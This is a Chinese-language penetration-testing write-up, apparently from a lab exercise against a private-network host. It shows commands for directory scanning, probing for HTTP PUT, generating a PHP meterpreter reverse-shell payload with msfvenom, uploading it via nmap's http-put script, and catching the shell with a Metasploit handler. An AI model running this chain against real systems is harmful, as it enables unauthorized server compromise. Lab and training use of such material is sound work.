## **3、渗透测试**

### **3.1 HTTP渗透**

#### 1.访问站点信息如下

访问80端口页面未发现有用信息，同时查看网页源代码未发现有用信息

![](../Images/d2ddfd852423e48d4dc08350861f66e3.png)

#### 2.目录扫描测试

```
dirb http://192.168.207.137
```

发现有一个test目录

![](../Images/d7a859700eb158d5ffda13349c3bc331.png)

#### 3.测试站点其他项

```
curl -v -X OPTIONS http://192.168.207.137/test
```

支持PUT和MOVE选项

![](../Images/bab5eb93e6afa5612d121d741fc8c9e0.png)

#### 4.创建反弹shell连接

```
msfvenom -p php/meterpreter/reverse\_tcp lhost=192.168.207.130 lport=443 -f raw
```

![](../Images/08a7787f8ac400a874bc253c55892aa2.png)

#### 5.上传反弹shell文件

```
nmap -p80 192.168.207.137 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php'
```

![](../Images/f760bd598c114a9517c8bb551b8e17f6.png)

#### 6.开启MSF监听

```


use exploit/multi/handler
```

访问站点获取到反弹shell连接

![](../Images/cf06dd0b42cf132dd16059a74c468a45.png)
